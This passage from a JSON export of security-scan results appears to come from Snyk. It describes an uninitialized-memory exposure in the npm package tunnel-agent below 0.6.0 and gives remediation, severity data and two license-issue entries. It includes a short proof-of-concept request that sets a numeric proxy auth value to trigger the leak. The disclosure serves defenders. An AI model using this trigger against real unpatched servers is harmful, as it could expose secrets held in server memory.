        "description": "## Overview\r\n[`tunnel-agent`](https://www.npmjs.com/package/tunnel-agent) is HTTP proxy tunneling agent. Affected versions of the package are vulnerable to Uninitialized Memory Exposure. \r\n\r\nA possible memory disclosure vulnerability exists when a value of type `number` is used to set the _proxy.auth_ option of a request `request` and results in a possible uninitialized memory exposures in the request body.\r\n\r\nThis is a result of unobstructed use of the `Buffer` constructor, whose [insecure default constructor increases the odds of memory leakage](https://snyk.io/blog/exploiting-buffer/).\r\n\r\n## Details\r\nConstructing a `Buffer` class with integer `N` creates a `Buffer` of length `N` with raw (not \"zero-ed\") memory.\r\n\r\nIn the following example, the first call would allocate 100 bytes of memory, while the second example will allocate the memory needed for the string \"100\":\r\n```js\r\n// uninitialized Buffer of length 100\r\nx = new Buffer(100);\r\n// initialized Buffer with value of '100'\r\nx = new Buffer('100');\r\n```\r\n\r\n`tunnel-agent`'s `request` construction uses the default `Buffer` constructor as-is, making it easy to append uninitialized memory to an existing list. If the value of the buffer list is exposed to users, it may expose raw server side memory, potentially holding secrets, private data and code. This is a similar vulnerability to the infamous [`Heartbleed`](http://heartbleed.com/) flaw in OpenSSL.\r\n\r\n#### Proof of concept by ChALkeR\r\n```js\r\nrequire('request')({\r\n  method: 'GET',\r\n  uri: 'http://www.example.com',\r\n  tunnel: true,\r\n  proxy:{\r\n      protocol: 'http:',\r\n      host:\"127.0.0.1\",\r\n      port:8080,\r\n      auth:80\r\n  }\r\n});\r\n```\r\n\r\nYou can read more about the insecure `Buffer` behavior [on our blog](https://snyk.io/blog/exploiting-buffer/).\r\n\r\nSimilar vulnerabilities were discovered in [request](https://snyk.io/vuln/npm:request:20160119), [mongoose](https://snyk.io/vuln/npm:mongoose:20160116), [ws](https://snyk.io/vuln/npm:ws:20160104) and [sequelize](https://snyk.io/vuln/npm:sequelize:20160115).\r\n\r\n## Remediation\r\nUpgrade `tunnel-agent` to version 0.6.0 or higher.\r\n**Note** This is vulnerable only for Node <=4\n\n## References\n- [https://github.com/request/tunnel-agent/commit/9ca95ec7219daface8a6fc2674000653de0922c0](https://github.com/request/tunnel-agent/commit/9ca95ec7219daface8a6fc2674000653de0922c0)\n- [https://gist.github.com/ChALkeR/fd6b2c445834244e7d440a043f9d2ff4](https://gist.github.com/ChALkeR/fd6b2c445834244e7d440a043f9d2ff4)\n",
        "created_at": "2017-07-05T07:23:57Z",
        "updated_at": "2024-03-06T13:59:00Z",
        "problems": [
          {
            "id": "CWE-201",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.6.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.6.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.6.0"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.1,
            "vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2017-03-04T22:00:00Z",
            "exploit": "Proof of Concept",
            "publication_time": "2017-07-05T14:05:50Z",
            "references": [
              {
                "url": "https://github.com/request/tunnel-agent/commit/9ca95ec7219daface8a6fc2674000653de0922c0",
                "title": "GitHub Commit"
              },
              {
                "url": "https://gist.github.com/ChALkeR/fd6b2c445834244e7d440a043f9d2ff4",
                "title": "PoC by ChALkeR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "snyk:lic:npm:goof:GPL-2.0",
      "type": "license_issues",
      "attributes": {
        "title": "GPL-2.0 license",
        "description": "GPL-2.0 license",
        "created_at": "2024-06-20T12:03:36Z",
        "severity": "high",
        "license": "GPL-2.0"
      }
    },
    {
      "id": "snyk:lic:npm:symbol:MPL-2.0",
      "type": "license_issues",
      "attributes": {
        "title": "MPL-2.0 license",
        "description": "MPL-2.0 license",
        "created_at": "2024-06-20T12:03:36Z",
        "severity": "medium",
        "license": "MPL-2.0"
      }
    }
  ]
}
